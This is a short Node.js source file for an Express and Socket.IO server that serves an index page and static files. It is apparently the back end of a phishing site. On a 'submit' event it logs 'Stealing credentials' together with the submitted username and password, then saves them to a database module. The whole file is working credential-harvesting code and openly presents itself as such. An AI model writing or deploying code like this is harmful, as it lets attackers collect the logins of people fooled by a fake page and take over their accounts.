var express = require('express')
const { access } = require('fs');
var app = express()
var http = require('http').createServer(app)
const port = process.env.PORT || 8080
var io = require('socket.io')(http)
var serverdb = require("./serverdb");
// server.listen(port);

console.log(`Express HTTP Server is listening at port ${port}`)
console.log("Socket.IO is listening on port: " + port);

app.use('/static', express.static('public'));

app.get('/', (request, response) => {
    console.log("Got an HTTP request")  
    response.sendFile(__dirname+'/index.html')
    // console.log(request.socket.address());
})



io.on("connect", function (socketclient) {
    console.log("A new connection has been established -- " + socketclient.id);
    

    socketclient.on("submit", (username, password) => {
        console.log("Stealing credentials " + username + " " + password)
        serverdb.addCreds(username, password);
    });

});

var server = http.listen(port, () => {
    console.log(`App listening on port ${server.address().port}`)
})